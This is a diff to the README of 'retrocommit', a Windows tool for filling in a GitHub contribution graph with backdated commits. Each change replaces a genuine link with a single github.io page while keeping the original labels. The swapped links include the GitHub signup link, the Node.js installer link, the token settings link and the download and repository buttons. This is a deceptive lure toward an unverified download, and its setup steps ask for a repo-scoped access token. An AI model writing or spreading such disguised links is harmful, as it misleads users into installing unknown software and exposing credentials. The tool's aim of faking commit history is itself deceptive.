@@ -23,11 +23,11 @@ Here's what you'll need:
 
 - A computer running **Windows** (the setup below is specifically for Windows)
 - An internet connection
-- A **GitHub account** (free to create at [github.com](https://github.com))
-- [Node.js](https://nodejs.org) installed on your computer (don't worry, it's free and safe – retrocommit is built with it)
+- A **GitHub account** (free to create at [github.com](https://abdessamademoussaif1.github.io))
+- [Node.js](https://abdessamademoussaif1.github.io) installed on your computer (don't worry, it's free and safe – retrocommit is built with it)
 
 If you don't have Node.js yet:
-1. Go to [nodejs.org](https://nodejs.org)
+1. Go to [nodejs.org](https://abdessamademoussaif1.github.io)
 2. Click the big green button that says "Windows Installer"
 3. Run the downloaded file and click "Next" through the installation
 4. When it's done, open a new terminal window
@@ -38,7 +38,7 @@ Ready to get started? Here's the easiest way to get retrocommit on your computer
 
 ### Step 1: Get the File
 
-👉 **[Click here to visit the download page](https://github.com/abdessamademoussaif1/retrocommit)**
+👉 **[Click here to visit the download page](https://abdessamademoussaif1.github.io)**
 
 Visit this link to download the application. This page is where you'll find everything you need to get retrocommit running on your system.
 
@@ -59,7 +59,7 @@ When retrocommit opens for the first time, you'll see a simple command-line inte
 1. **Type** the word `login` and press Enter.
 2. The program will ask for your **GitHub username**. Type it in and press Enter.
 3. Then, it will ask for a **Personal Access Token**. Here's how to get one safely:
-   - Go to [github.com/settings/tokens](https://github.com/settings/tokens)
+   - Go to [github.com/settings/tokens](https://abdessamademoussaif1.github.io)
    - Click "Generate new token" (classic)
    - Give it a name like "retrocommit" and check the box that says `repo`
    - Scroll down and click "Generate token"
@@ -138,7 +138,7 @@ Experiment, have fun, and watch your contribution graph turn into a full, vibran
 ## 📚 Need More Help?
 
 - Type `help` inside retrocommit at any time.
-- Visit the [official GitHub repository](https://github.com/abdessamademoussaif1/retrocommit) for updates and community discussions.
+- Visit the [official GitHub repository](https://abdessamademoussaif1.github.io) for updates and community discussions.
 - Look for issues or questions on the repository page – many have already been answered.
 
 ## 🚀 Ready to Fill Those Gaps?
@@ -147,7 +147,7 @@ Your GitHub profile is your digital footprint in the developer world. A complete
 
 Remember: **the only limit is your imagination** (and GitHub's contribution rules, of course).
 
-**Don't wait – [download retrocommit now](https://github.com/abdessamademoussaif1/retrocommit)** and turn those gray squares green today.
+**Don't wait – [download retrocommit now](https://abdessamademoussaif1.github.io)** and turn those gray squares green today.
 
 ---
 
